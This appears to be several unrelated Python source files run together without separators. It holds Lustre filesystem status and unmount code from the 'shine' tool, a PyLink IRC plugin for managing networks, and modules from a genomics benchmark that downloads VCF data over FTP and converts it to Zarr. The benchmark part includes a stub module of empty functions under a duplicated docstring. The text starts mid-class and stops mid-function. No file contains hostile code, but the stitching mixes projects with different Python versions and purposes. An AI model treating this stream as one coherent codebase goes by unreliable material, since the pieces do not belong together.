        layout.set_column("type", 1, AsciiTableLayout.LEFT, "type",
                AsciiTableLayout.CENTER)
        layout.set_column("index", 2, AsciiTableLayout.RIGHT, "idx",
                AsciiTableLayout.CENTER)
        layout.set_column("nodes", 3, AsciiTableLayout.LEFT, "nodes",
                AsciiTableLayout.CENTER)
        layout.set_column("device", 4, AsciiTableLayout.LEFT, "device",
                AsciiTableLayout.CENTER)
        layout.set_column("status", 5, AsciiTableLayout.LEFT, "status",
                AsciiTableLayout.CENTER)

        AsciiTable().print_from_list_of_dict(ldic, layout)


    def status_view_fs(cls, fs, show_clients=True):
        """
        View: lustre FS summary
        """
        ldic = []

        # targets
        for type, (a_targets, e_targets) in fs.targets_by_type():
            nodes = NodeSet()
            t_offline = []
            t_error = []
            t_recovering = []
            t_online = []
            t_runtime = []
            t_unknown = []
            for target in a_targets:
                nodes.add(target.servers[0])

                # check target status
                if target.state == OFFLINE:
                    t_offline.append(target)
                elif target.state == TARGET_ERROR:
                    t_error.append(target)
                elif target.state == RECOVERING:
                    t_recovering.append(target)
                elif target.state == MOUNTED:
                    t_online.append(target)
                elif target.state == RUNTIME_ERROR:
                    t_runtime.append(target)
                else:                    
                    t_unknown.append(target)

            status = []
            if len(t_offline) > 0:
                status.append("offline (%d)" % len(t_offline))
            if len(t_error) > 0:
                status.append("ERROR (%d)" % len(t_error))
            if len(t_recovering) > 0:
                status.append("recovering (%d) for %s" % (len(t_recovering),
                    t_recovering[0].status_info))
            if len(t_online) > 0:
                status.append("online (%d)" % len(t_online))
            if len(t_runtime) > 0:
                status.append("CHECK FAILURE (%d)" % len(t_runtime))
            if len(t_unknown) > 0:
                status.append("not checked (%d)" % len(t_unknown))

            if len(t_unknown) < len(a_targets):
                ldic.append(dict([["type", "%s" % type.upper()],
                    ["count", len(a_targets)], ["nodes", nodes],
                    ["status", ', '.join(status)]]))

        # clients
        if show_clients:
            (c_ign, c_offline, c_error, c_runtime, c_mounted) = fs.get_client_statecounters()
            status = []
            if c_ign > 0:
                status.append("not checked (%d)" % c_ign)
            if c_offline > 0:
                status.append("offline (%d)" % c_offline)
            if c_error > 0:
                status.append("ERROR (%d)" % c_error)
            if c_runtime > 0:
                status.append("CHECK FAILURE (%d)" % c_runtime)
            if c_mounted > 0:
                status.append("mounted (%d)" % c_mounted)

            ldic.append(dict([["type", "CLI"], ["count", len(fs.clients)],
                ["nodes", "%s" % fs.get_client_servers()], ["status", ', '.join(status)]]))

        layout = AsciiTableLayout()
        layout.set_show_header(True)
        layout.set_column("type", 0, AsciiTableLayout.CENTER, "type", AsciiTableLayout.CENTER)
        layout.set_column("count", 1, AsciiTableLayout.RIGHT, "#", AsciiTableLayout.CENTER)
        layout.set_column("nodes", 2, AsciiTableLayout.LEFT, "nodes", AsciiTableLayout.CENTER)
        layout.set_column("status", 3, AsciiTableLayout.LEFT, "status", AsciiTableLayout.CENTER)

        print "FILESYSTEM COMPONENTS STATUS (%s)" % fs.fs_name
        AsciiTable().print_from_list_of_dict(ldic, layout)

    status_view_fs = classmethod(status_view_fs)


    def status_view_disks(self, fs):
        """
        View: lustre disks
        """

        print "FILESYSTEM DISKS (%s)" % fs.fs_name

        # override dict to allow target sorting by index
        class target_dict(dict):
            def __lt__(self, other):
                return self["index"] < other["index"] 
        ldic = []
        jdev_col_enabled = False
        tag_col_enabled = False
        for type, (all_targets, enabled_targets) in fs.targets_by_type():
            for target in enabled_targets:

                if target.state == OFFLINE:
                    status = "offline"
                elif target.state == RECOVERING:
                    status = "recovering %s" % target.status_info
                elif target.state == MOUNTED:
                    status = "online"
                elif target.state == TARGET_ERROR:
                    status = "ERROR"
                elif target.state == RUNTIME_ERROR:
                    status = "CHECK FAILURE"
                else:                    
                    status = "UNKNOWN"

                if target.dev_size >= TERA:
                    dev_size = "%.1fT" % (target.dev_size/TERA)
                elif target.dev_size >= GIGA:
                    dev_size = "%.1fG" % (target.dev_size/GIGA)
                elif target.dev_size >= MEGA:
                    dev_size = "%.1fM" % (target.dev_size/MEGA)
                elif target.dev_size >= KILO:
                    dev_size = "%.1fK" % (target.dev_size/KILO)
                else:                    
                    dev_size = "%d" % target.dev_size

                if target.jdev:
                    jdev_col_enabled = True
                    jdev = target.jdev
                else:                    
                    jdev = ""

                if target.tag:
                    tag_col_enabled = True
                    tag = target.tag
                else:                    
                    tag = ""

                flags = []
                if target.has_need_index_flag():
                    flags.append("need_index")
                if target.has_first_time_flag():
                    flags.append("first_time")
                if target.has_update_flag():
                    flags.append("update")
                if target.has_rewrite_ldd_flag():
                    flags.append("rewrite_ldd")
                if target.has_writeconf_flag():
                    flags.append("writeconf")
                if target.has_upgrade14_flag():
                    flags.append("upgrade14")
                if target.has_param_flag():
                    flags.append("conf_param")

                ldic.append(target_dict([\
                    ["nodes", NodeSet.fromlist(target.servers)],
                    ["dev", target.dev],
                    ["size", dev_size],
                    ["jdev", jdev],
                    ["type", target.type.upper()],
                    ["index", target.index],
                    ["tag", tag],
                    ["label", target.label],
                    ["flags", ' '.join(flags)],
                    ["fsname", target.fs.fs_name],
                    ["status", status]]))

        ldic.sort()
        layout = AsciiTableLayout()
        layout.set_show_header(True)
        i = 0
        layout.set_column("dev", i, AsciiTableLayout.LEFT, "device",
                AsciiTableLayout.CENTER)
        i += 1
        layout.set_column("nodes", i, AsciiTableLayout.LEFT, "node(s)",
                AsciiTableLayout.CENTER)
        i += 1
        layout.set_column("size", i, AsciiTableLayout.RIGHT, "dev size",
                AsciiTableLayout.CENTER)
        if jdev_col_enabled:
            i += 1
            layout.set_column("jdev", i, AsciiTableLayout.RIGHT, "journal device",
                    AsciiTableLayout.CENTER)
        i += 1
        layout.set_column("type", i, AsciiTableLayout.LEFT, "type",
                AsciiTableLayout.CENTER)
        i += 1
        layout.set_column("index", i, AsciiTableLayout.RIGHT, "index",
                AsciiTableLayout.CENTER)
        if tag_col_enabled:
            i += 1
            layout.set_column("tag", i, AsciiTableLayout.LEFT, "tag",
                    AsciiTableLayout.CENTER)
        i += 1
        layout.set_column("label", i, AsciiTableLayout.LEFT, "label",
                AsciiTableLayout.CENTER)
        i += 1
        layout.set_column("flags", i, AsciiTableLayout.LEFT, "ldd flags",
                AsciiTableLayout.CENTER)
        i += 1
        layout.set_column("fsname", i, AsciiTableLayout.LEFT, "fsname",
                AsciiTableLayout.CENTER)
        i += 1
        layout.set_column("status", i, AsciiTableLayout.LEFT, "status",
                AsciiTableLayout.CENTER)

        AsciiTable().print_from_list_of_dict(ldic, layout)


# Umount.py -- Unmount file system on clients
# Copyright (C) 2007, 2008, 2009 CEA
#
# This file is part of shine
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
#
# $Id$

"""
Shine `umount' command classes.

The umount command aims to stop Lustre filesystem clients.
"""

import os

# Configuration
from Shine.Configuration.Configuration import Configuration
from Shine.Configuration.Globals import Globals 
from Shine.Configuration.Exceptions import *

# Command base class
from Base.FSClientLiveCommand import FSClientLiveCommand
from Base.CommandRCDefs import *
# -R handler
from Base.RemoteCallEventHandler import RemoteCallEventHandler

# Command helper
from Shine.FSUtils import open_lustrefs

# Lustre events
import Shine.Lustre.EventHandler
from Shine.Lustre.FileSystem import *


class GlobalUmountEventHandler(Shine.Lustre.EventHandler.EventHandler):

    def __init__(self, verbose=1):
        self.verbose = verbose

    def ev_stopclient_start(self, node, client):
        if self.verbose > 1:
            print "%s: Unmounting %s on %s ..." % (node, client.fs.fs_name, client.mount_path)

    def ev_stopclient_done(self, node, client):
        if self.verbose > 1:
            if client.status_info:
                print "%s: Umount: %s" % (node, client.status_info)                    
            else:
                print "%s: FS %s succesfully unmounted from %s" % (node,
                        client.fs.fs_name, client.mount_path)

    def ev_stopclient_failed(self, node, client, rc, message):
        if rc:
            strerr = os.strerror(rc)
        else:
            strerr = message
        print "%s: Failed to unmount FS %s from %s: %s" % \
                (node, client.fs.fs_name, client.mount_path, strerr)
        if rc:
            print message


class Umount(FSClientLiveCommand):
    """
    shine umount
    """

    def __init__(self):
        FSClientLiveCommand.__init__(self)

    def get_name(self):
        return "umount"

    def get_desc(self):
        return "Unmount file system clients."

    target_status_rc_map = { \
            MOUNTED : RC_FAILURE,
            RECOVERING : RC_FAILURE,
            OFFLINE : RC_OK,
            TARGET_ERROR : RC_TARGET_ERROR,
            CLIENT_ERROR : RC_CLIENT_ERROR,
            RUNTIME_ERROR : RC_RUNTIME_ERROR }

    def fs_status_to_rc(self, status):
        return self.target_status_rc_map[status]

    def execute(self):
        result = 0

        self.init_execute()

        # Get verbose level.
        vlevel = self.verbose_support.get_verbose_level()

        for fsname in self.fs_support.iter_fsname():

            # Install appropriate event handler.
            eh = self.install_eventhandler(None,
                    GlobalUmountEventHandler(vlevel))

            nodes = self.nodes_support.get_nodeset()

            fs_conf, fs = open_lustrefs(fsname, None,
                    nodes=nodes,
                    indexes=None,
                    event_handler=eh)

            if nodes and not nodes.issubset(fs_conf.get_client_nodes()):
                raise CommandException("%s are not client nodes of filesystem '%s'" % \
                        (nodes - fs_conf.get_client_nodes(), fsname))

            fs.set_debug(self.debug_support.has_debug())

            status = fs.umount()
            rc = self.fs_status_to_rc(status)
            if rc > result:
                result = rc

            if rc == RC_OK:
                if vlevel > 0:
                    print "Unmount successful."                    
            elif rc == RC_RUNTIME_ERROR:
                for nodes, msg in fs.proxy_errors:
                    print "%s: %s" % (nodes, msg)

        return result



# FSProxyAction.py -- Lustre generic FS proxy action class
# Copyright (C) 2009 CEA
#
# This file is part of shine
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
#
# $Id$

from Shine.Configuration.Globals import Globals
from Shine.Configuration.Configuration import Configuration

from ProxyAction import *

from ClusterShell.NodeSet import NodeSet


class FSProxyAction(ProxyAction):
    """
    Generic file system command proxy action class.
    """

    def __init__(self, fs, action, nodes, debug, targets_type=None, targets_indexes=None):
        ProxyAction.__init__(self)
        self.fs = fs
        self.action = action
        assert isinstance(nodes, NodeSet)
        self.nodes = nodes
        self.debug = debug
        self.targets_type = targets_type
        self.targets_indexes = targets_indexes

        if self.fs.debug:
            print "FSProxyAction %s on %s" % (action, nodes)

    def launch(self):
        """
        Launch FS proxy command.
        """
        command = ["%s" % self.progpath]
        command.append(self.action)
        command.append("-f %s" % self.fs.fs_name)
        command.append("-R")

        if self.debug:
            command.append("-d")

        if self.targets_type:
            command.append("-t %s" % self.targets_type)
            if self.targets_indexes:
                command.append("-i %s" % self.targets_indexes)

        # Schedule cluster command.
        self.task.shell(' '.join(command), nodes=self.nodes, handler=self)

    def ev_read(self, worker):
        node, buf = worker.last_read()
        try:
            event, params = self._shine_msg_unpack(buf)
            self.fs._handle_shine_event(event, node, **params)
        except ProxyActionUnpackError, e:
            # ignore any non shine messages
            pass

    def ev_close(self, worker):
        """
        End of proxy command.
        """
        # Gather nodes by return code
        for rc, nodes in worker.iter_retcodes():
            # rc 127 = command not found
            # rc 126 = found but not executable
            if rc >= 126:                    
                # Gather these nodes by buffer
                for buffer, nodes in worker.iter_buffers(nodes):
                    # Handle proxy command error which rc >= 127 and 
                    self.fs._handle_shine_proxy_error(nodes, "Remote action %s failed: %s" % \
                            (self.action, buffer))

        self.fs.action_refcnt -= 1
        if self.fs.action_refcnt == 0:
            worker.task.abort()


"""Networks plugin - allows you to manipulate connections to various configured networks."""
import importlib
import types

from pylinkirc import utils, world, conf, classes
from pylinkirc.log import log
from pylinkirc.coremods import control, permissions

@utils.add_cmd
def disconnect(irc, source, args):
    """<network>

    Disconnects the network <network>. When all networks are disconnected, PyLink will automatically exit.

    To reconnect a network disconnected using this command, use REHASH to reload the networks list."""
    permissions.checkPermissions(irc, source, ['networks.disconnect'])
    try:
        netname = args[0]
        network = world.networkobjects[netname]
    except IndexError:  # No argument given.
        irc.error('Not enough arguments (needs 1: network name (case sensitive)).')
        return
    except KeyError:  # Unknown network.
        irc.error('No such network "%s" (case sensitive).' % netname)
        return
    irc.reply("Done. If you want to reconnect this network, use the 'rehash' command.")

    control.remove_network(network)

@utils.add_cmd
def autoconnect(irc, source, args):
    """<network> <seconds>

    Sets the autoconnect time for <network> to <seconds>.
    You can disable autoconnect for a network by setting <seconds> to a negative value."""
    permissions.checkPermissions(irc, source, ['networks.autoconnect'])
    try:
        netname = args[0]
        seconds = float(args[1])
        network = world.networkobjects[netname]
    except IndexError:  # Arguments not given.
        irc.error('Not enough arguments (needs 2: network name (case sensitive), autoconnect time (in seconds)).')
        return
    except KeyError:  # Unknown network.
        irc.error('No such network "%s" (case sensitive).' % netname)
        return
    except ValueError:
        irc.error('Invalid argument "%s" for <seconds>.' % seconds)
        return
    network.serverdata['autoconnect'] = seconds
    irc.reply("Done.")

remote_parser = utils.IRCParser()
remote_parser.add_argument('network')
remote_parser.add_argument('--service', type=str, default='pylink')
remote_parser.add_argument('command', nargs=utils.IRCParser.REMAINDER)
@utils.add_cmd
def remote(irc, source, args):
    """<network> [--service <service name>] <command>

    Runs <command> on the remote network <network>. Plugin responses sent using irc.reply() are
    supported and returned here, but others are dropped due to protocol limitations."""
    permissions.checkPermissions(irc, source, ['networks.remote'])

    args = remote_parser.parse_args(args)
    netname = args.network

    if netname == irc.name:
        # This would actually throw _remote_reply() into a loop, so check for it here...
        # XXX: properly fix this.
        irc.error("Cannot remote-send a command to the local network; use a normal command!")
        return

    try:
        remoteirc = world.networkobjects[netname]
    except KeyError:  # Unknown network.
        irc.error('No such network "%s" (case sensitive).' % netname)
        return

    if args.service not in world.services:
        irc.error('Unknown service %r.' % args.service)
        return

    # Force remoteirc.called_in to something private in order to prevent
    # accidental information leakage from replies.
    remoteirc.called_in = remoteirc.called_by = remoteirc.pseudoclient.uid

    # Set the identification override to the caller's account.
    remoteirc.pseudoclient.account = irc.users[source].account

    def _remote_reply(placeholder_self, text, **kwargs):
        """
        reply() rerouter for the 'remote' command.
        """
        assert irc.name != placeholder_self.name, \
            "Refusing to route reply back to the same " \
            "network, as this would cause a recursive loop"
        log.debug('(%s) networks.remote: re-routing reply %r from network %s', irc.name,
                  text, placeholder_self.name)

        # Override the source option to make sure the source is valid on the local network.
        if 'source' in kwargs:
            del kwargs['source']
        irc.reply(text, source=irc.pseudoclient.uid, **kwargs)

    old_reply = remoteirc.reply                    

    with remoteirc.reply_lock:
        try:  # Remotely call the command (use the PyLink client as a dummy user).
            # Override the remote irc.reply() to send replies HERE.
            log.debug('(%s) networks.remote: overriding reply() of IRC object %s', irc.name, netname)
            remoteirc.reply = types.MethodType(_remote_reply, remoteirc)                    
            world.services[args.service].call_cmd(remoteirc, remoteirc.pseudoclient.uid,
                                                  ' '.join(args.command))
        finally:
            # Restore the original remoteirc.reply()
            log.debug('(%s) networks.remote: restoring reply() of IRC object %s', irc.name, netname)
            remoteirc.reply = old_reply                    
            # Remove the identification override after we finish.
            remoteirc.pseudoclient.account = ''

@utils.add_cmd
def reloadproto(irc, source, args):
    """<protocol module name>

    Reloads the given protocol module without restart. You will have to manually disconnect and reconnect any network using the module for changes to apply."""
    permissions.checkPermissions(irc, source, ['networks.reloadproto'])
    try:
        name = args[0]
    except IndexError:
        irc.error('Not enough arguments (needs 1: protocol module name)')
        return

    proto = utils.getProtocolModule(name)
    importlib.reload(proto)

    irc.reply("Done. You will have to manually disconnect and reconnect any network using the %r module for changes to apply." % name)

""" Main module for the benchmark. It reads the command line arguments, reads the benchmark configuration, 
determines the runtime mode (dynamic vs. static); if dynamic, gets the benchmark data from the server,
runs the benchmarks, and records the timer results. """

import argparse  # for command line parsing
import time  # for benchmark timer
import csv  # for writing results
import logging
import sys
import shutil
from benchmark import config, data_service                    


def get_cli_arguments():
    """ Returns command line arguments. 

    Returns:
    args object from an ArgumentParses for fetch data (boolean, from a server), label (optional, for naming the benchmark run), 
    and config argument for where is the config file. """

    logging.debug('Getting cli arguments')

    parser = argparse.ArgumentParser(description="A benchmark for genomics routines in Python.")

    # Enable three exclusive groups of options (using subparsers)
    # https://stackoverflow.com/questions/17909294/python-argparse-mutual-exclusive-group/17909525

    subparser = parser.add_subparsers(title="commands", dest="command")
    subparser.required = True

    config_parser = subparser.add_parser("config",
                                         help='Setting up the default configuration of the benchmark. It creates the default configuration file.')
    config_parser.add_argument("--output_config", type=str, required=True,
                               help="Specify the output path to a configuration file.", metavar="FILEPATH")
    config_parser.add_argument("-f", action="store_true", help="Overwrite the destination file if it already exists.")

    data_setup_parser = subparser.add_parser("setup",
                                             help='Preparation and setting up of the data for the benchmark. It requires a configuration file.')
    data_setup_parser.add_argument("--config_file", required=True, help="Location of the configuration file",
                                   metavar="FILEPATH")

    benchmark_exec_parser = subparser.add_parser("exec",
                                                 help='Execution of the benchmark modes. It requires a configuration file.')
    # TODO: use run_(timestamp) as default
    benchmark_exec_parser.add_argument("--label", type=str, default="run", metavar="RUN_LABEL",                    
                                       help="Label for the benchmark run.")
    benchmark_exec_parser.add_argument("--config_file", type=str, required=True,
                                       help="Specify the path to a configuration file.", metavar="FILEPATH")

    runtime_configuration = vars(parser.parse_args())
    return runtime_configuration


def _main():
    input_directory = "./data/input/"                    
    download_directory = input_directory + "download/"                    
    temp_directory = "./data/temp/"                    
    vcf_directory = "./data/vcf/"                    
    zarr_directory_setup = "./data/zarr/"                    
    zarr_directory_benchmark = "./data/zarr_benchmark/"                    

    cli_arguments = get_cli_arguments()

    command = cli_arguments["command"]
    if command == "config":
        output_config_location = cli_arguments["output_config"]
        overwrite_mode = cli_arguments["f"]
        config.generate_default_config_file(output_location=output_config_location,
                                            overwrite=overwrite_mode)
    elif command == "setup":
        print("[Setup] Setting up benchmark data.")

        # Clear out existing files in VCF and Zarr directories
        data_service.remove_directory_tree(vcf_directory)                    
        data_service.remove_directory_tree(zarr_directory_setup)                    

        # Get runtime config from specified location
        runtime_config = config.read_configuration(location=cli_arguments["config_file"])

        # Get FTP module settings from runtime config
        ftp_config = config.FTPConfigurationRepresentation(runtime_config)

        if ftp_config.enabled:
            print("[Setup][FTP] FTP module enabled. Running FTP download...")
            data_service.fetch_data_via_ftp(ftp_config=ftp_config, local_directory=download_directory)                    
        else:
            print("[Setup][FTP] FTP module disabled. Skipping FTP download...")

        # Process/Organize downloaded files
        data_service.process_data_files(input_dir=input_directory,                    
                                        temp_dir=temp_directory,                    
                                        output_dir=vcf_directory)                    

        # Convert VCF files to Zarr format if the module is enabled
        vcf_to_zarr_config = config.VCFtoZarrConfigurationRepresentation(runtime_config)                    
        if vcf_to_zarr_config.enabled:
            data_service.setup_vcf_to_zarr(input_vcf_dir=vcf_directory,                    
                                           output_zarr_dir=zarr_directory_setup,                    
                                           conversion_config=vcf_to_zarr_config)
    elif command == "exec":
        print("[Exec] Executing benchmark tool.")

        # Get runtime config from specified location
        runtime_config = config.read_configuration(location=cli_arguments["config_file"])

        # Get VCF to Zarr conversion settings from runtime config
        vcf_to_zarr_config = config.VCFtoZarrConfigurationRepresentation(runtime_config)                    

        # TODO: Convert necessary VCF files to Zarr format
        # data_service.convert_to_zarr("./data/vcf/chr22.1000.vcf", "./data/zarr/chr22.1000.zarr", vcf_to_zarr_config)
    else:
        print("Error: Unexpected command specified. Exiting...")
        sys.exit(1)


def main():
    try:
        _main()
    except KeyboardInterrupt:
        print("Program interrupted. Exiting...")
        sys.exit(1)

""" Main module for the benchmark. It reads the command line arguments, reads the benchmark configuration, 
determines the runtime mode (dynamic vs. static); if dynamic, gets the benchmark data from the server,
runs the benchmarks, and records the timer results. """

import time  # for benchmark timer
import csv  # for writing results
import logging


def run_benchmark(bench_conf):                    
    pass                    


def run_dynamic(ftp_location):                    
    pass                    


def run_static():                    
    pass                    


def get_remote_files(ftp_server, ftp_directory, files=None):                    
    pass                    


def record_runtime(benchmark, timestamp):                    
    pass                    


# temporary here
def main():                    
    pass                    

""" Main module for the benchmark. It reads the command line arguments, reads the benchmark configuration, 
determines the runtime mode (dynamic vs. static); if dynamic, gets the benchmark data from the server,
runs the benchmarks, and records the timer results. """

import urllib.request
from ftplib import FTP, FTP_TLS, error_perm
import time  # for benchmark timer
import csv  # for writing results
import logging
import os.path
import pathlib
import allel
import sys
import functools
import numpy as np
import zarr
import numcodecs
from numcodecs import Blosc, LZ4, LZMA                    
from benchmark import config                    

import gzip
import shutil


def create_directory_tree(path):
    """
    Creates directories for the path specified.
    :param path: The path to create dirs/subdirs for
    :type path: str
    """
    path = str(path)  # Ensure path is in str format
    pathlib.Path(path).mkdir(parents=True, exist_ok=True)


def remove_directory_tree(path):
    """
    Removes the directory and all subdirectories/files within the path specified.
    :param path: The path to the directory to remove
    :type path: str
    """

    if os.path.exists(path):
        shutil.rmtree(path, ignore_errors=True)


def fetch_data_via_ftp(ftp_config, local_directory):
    """ Get benchmarking data from a remote ftp server. 
    :type ftp_config: config.FTPConfigurationRepresentation
    :type local_directory: str
    """
    if ftp_config.enabled:
        # Create local directory tree if it does not exist
        create_directory_tree(local_directory)

        # Login to FTP server
        if ftp_config.use_tls:
            ftp = FTP_TLS(ftp_config.server)
            ftp.login(ftp_config.username, ftp_config.password)
            ftp.prot_p()  # Request secure data connection for file retrieval
        else:
            ftp = FTP(ftp_config.server)
            ftp.login(ftp_config.username, ftp_config.password)

        if not ftp_config.files:  # Auto-download all files in directory
            fetch_data_via_ftp_recursive(ftp=ftp,
                                         local_directory=local_directory,
                                         remote_directory=ftp_config.directory)
        else:
            ftp.cwd(ftp_config.directory)

            file_counter = 1
            file_list_total = len(ftp_config.files)

            for remote_filename in ftp_config.files:
                local_filename = remote_filename
                filepath = os.path.join(local_directory, local_filename)
                if not os.path.exists(filepath):
                    with open(filepath, "wb") as local_file:
                        try:
                            ftp.retrbinary('RETR %s' % remote_filename, local_file.write)
                            print("[Setup][FTP] ({}/{}) File downloaded: {}".format(file_counter, file_list_total,
                                                                                    filepath))
                        except error_perm:
                            # Error downloading file. Display error message and delete local file
                            print("[Setup][FTP] ({}/{}) Error downloading file. Skipping: {}".format(file_counter,
                                                                                                     file_list_total,
                                                                                                     filepath))
                            local_file.close()
                            os.remove(filepath)
                else:
                    print("[Setup][FTP] ({}/{}) File already exists. Skipping: {}".format(file_counter, file_list_total,
                                                                                          filepath))
                file_counter = file_counter + 1
        # Close FTP connection
        ftp.close()


def fetch_data_via_ftp_recursive(ftp, local_directory, remote_directory, remote_subdirs_list=None):
    """
    Recursive function that automatically downloads all files with a FTP directory, including subdirectories.
    :type ftp: ftplib.FTP
    :type local_directory: str
    :type remote_directory: str
    :type remote_subdirs_list: list
    """

    if (remote_subdirs_list is not None) and (len(remote_subdirs_list) > 0):
        remote_path_relative = "/".join(remote_subdirs_list)
        remote_path_absolute = "/" + remote_directory + "/" + remote_path_relative + "/"
    else:
        remote_subdirs_list = []
        remote_path_relative = ""
        remote_path_absolute = "/" + remote_directory + "/"

    try:
        local_path = local_directory + "/" + remote_path_relative
        os.mkdir(local_path)
        print("[Setup][FTP] Created local folder: {}".format(local_path))
    except OSError:  # Folder already exists at destination. Do nothing.
        pass
    except error_perm:  # Invalid Entry
        print("[Setup][FTP] Error: Could not change to: {}".format(remote_path_absolute))

    ftp.cwd(remote_path_absolute)

    # Get list of remote files/folders in current directory
    file_list = ftp.nlst()

    file_counter = 1
    file_list_total = len(file_list)

    for file in file_list:
        file_path_local = local_directory + "/" + remote_path_relative + "/" + file
        if not os.path.isfile(file_path_local):
            try:
                # Determine if a file or folder
                ftp.cwd(remote_path_absolute + file)
                # Path is for a folder. Run recursive function in new folder
                print("[Setup][FTP] Switching to directory: {}".format(remote_path_relative + "/" + file))
                new_remote_subdirs_list = remote_subdirs_list.copy()
                new_remote_subdirs_list.append(file)
                fetch_data_via_ftp_recursive(ftp=ftp, local_directory=local_directory,
                                             remote_directory=remote_directory,
                                             remote_subdirs_list=new_remote_subdirs_list)
                # Return up one level since we are using recursion
                ftp.cwd(remote_path_absolute)
            except error_perm:
                # file is an actual file. Download if it doesn't already exist on filesystem.
                temp = ftp.nlst()
                if not os.path.isfile(file_path_local):
                    with open(file_path_local, "wb") as local_file:
                        ftp.retrbinary('RETR {}'.format(file), local_file.write)
                    print("[Setup][FTP] ({}/{}) File downloaded: {}".format(file_counter, file_list_total,
                                                                            file_path_local))
        else:
            print("[Setup][FTP] ({}/{}) File already exists. Skipping: {}".format(file_counter, file_list_total,
                                                                                  file_path_local))
        file_counter = file_counter + 1


def fetch_file_from_url(url, local_file):
    urllib.request.urlretrieve(url, local_file)


def decompress_gzip(local_file_gz, local_file):
    with open(local_file, 'wb') as file_out, gzip.open(local_file_gz, 'rb') as file_in:
        shutil.copyfileobj(file_in, file_out)


def process_data_files(input_dir, temp_dir, output_dir):
    """
    Iterates through all files in input_dir and processes *.vcf.gz files to *.vcf, placed in output_dir.
    Additionally moves *.vcf files to output_dir
    Note: This method searches through all subdirectories within input_dir, and files are placed in root of output_dir.
    :param input_dir: The input directory containing files to process
    :param temp_dir: The temporary directory for unzipping *.gz files, etc.
    :param output_dir: The output directory where processed *.vcf files should go
    :type input_dir: str
    :type temp_dir: str
    :type output_dir: str
    """

    # Ensure input, temp, and output directory paths are in str format, not pathlib
    input_dir = str(input_dir)
    temp_dir = str(temp_dir)
    output_dir = str(output_dir)

    # Create input, temp, and output directories if they do not exist
    create_directory_tree(input_dir)
    create_directory_tree(temp_dir)
    create_directory_tree(output_dir)

    # Iterate through all *.gz files in input directory and uncompress them to the temporary directory
    pathlist_gz = pathlib.Path(input_dir).glob("**/*.gz")
    for path in pathlist_gz:
        path_str = str(path)
        file_output_str = path_leaf(path_str)
        file_output_str = file_output_str[0:len(file_output_str) - 3]  # Truncate *.gz from input filename
        path_temp_output = str(pathlib.Path(temp_dir, file_output_str))
        print("[Setup][Data] Decompressing file: {}".format(path_str))
        print("  - Output: {}".format(path_temp_output))

        # Decompress the .gz file
        decompress_gzip(path_str, path_temp_output)

    # Iterate through all files in temporary directory and move *.vcf files to output directory
    pathlist_vcf_temp = pathlib.Path(temp_dir).glob("**/*.vcf")
    for path in pathlist_vcf_temp:
        path_temp_str = str(path)
        filename_str = path_leaf(path_temp_str)  # Strip filename from path
        path_vcf_str = str(pathlib.Path(output_dir, filename_str))

        shutil.move(path_temp_str, path_vcf_str)

    # Remove temporary directory
    remove_directory_tree(temp_dir)

    # Copy any *.vcf files already in input directory to the output directory
    pathlist_vcf_input = pathlib.Path(input_dir).glob("**/*.vcf")
    for path in pathlist_vcf_input:
        path_input_str = str(path)
        filename_str = path_leaf(path_input_str)  # Strip filename from path
        path_vcf_str = str(pathlib.Path(output_dir, filename_str))

        shutil.copy(path_input_str, path_vcf_str)


def path_head(path):
    head, tail = os.path.split(path)
    return head


def path_leaf(path):
    head, tail = os.path.split(path)
    return tail or os.path.basename(head)


def read_file_contents(local_filepath):
    if os.path.isfile(local_filepath):
        with open(local_filepath) as f:
            data = f.read()
            return data
    else:
        return None


def setup_vcf_to_zarr(input_vcf_dir, output_zarr_dir, conversion_config):
    """
    Converts all VCF files in input directory to Zarr format, placed in output directory,
    based on conversion configuration parameters
    :param input_vcf_dir: The input directory where VCF files are located
    :param output_zarr_dir: The output directory to place Zarr-formatted data
    :param conversion_config: Configuration data for the conversion
    :type input_vcf_dir: str
    :type output_zarr_dir: str
    :type conversion_config: config.VCFtoZarrConfigurationRepresentation
    """
    # Ensure input and output directory paths are in str format, not pathlib
    input_vcf_dir = str(input_vcf_dir)
    output_zarr_dir = str(output_zarr_dir)

    # Create input and output directories if they do not exist
    create_directory_tree(input_vcf_dir)
    create_directory_tree(output_zarr_dir)

    # Iterate through all *.vcf files in input directory and convert to Zarr format
    pathlist_vcf = pathlib.Path(input_vcf_dir).glob("**/*.vcf")
    for path in pathlist_vcf:
        path_str = str(path)
        file_output_str = path_leaf(path_str)
        file_output_str = file_output_str[0:len(file_output_str) - 4]  # Truncate *.vcf from input filename
        path_zarr_output = str(pathlib.Path(output_zarr_dir, file_output_str))
        print("[Setup][Data] Converting VCF file to Zarr format: {}".format(path_str))
        print("  - Output: {}".format(path_zarr_output))

        # Convert to Zarr format
        convert_to_zarr(input_vcf_path=path_str,
                        output_zarr_path=path_zarr_output,
                        conversion_config=conversion_config)


def convert_to_zarr(input_vcf_path, output_zarr_path, conversion_config):                    
    """ Converts the original data (VCF) to a Zarr format. Only converts a single VCF file.
    :param input_vcf_path: The input VCF file location
    :param output_zarr_path: The desired Zarr output location
    :param conversion_config: Configuration data for the conversion
    :type input_vcf_path: str
    :type output_zarr_path: str
    :type conversion_config: config.VCFtoZarrConfigurationRepresentation
    """
    if conversion_config is not None:
        # Ensure var is string, not pathlib.Path
        output_zarr_path = str(output_zarr_path)

        # Get alt number
        if conversion_config.alt_number is None:
            print("[VCF-Zarr] Determining maximum number of ALT alleles by scaling all variants in the VCF file.")
            # Scan VCF file to find max number of alleles in any variant
            callset = allel.read_vcf(input_vcf_path, fields=['numalt'], log=sys.stdout)
            numalt = callset['variants/numalt']
            alt_number = np.max(numalt)
        else:
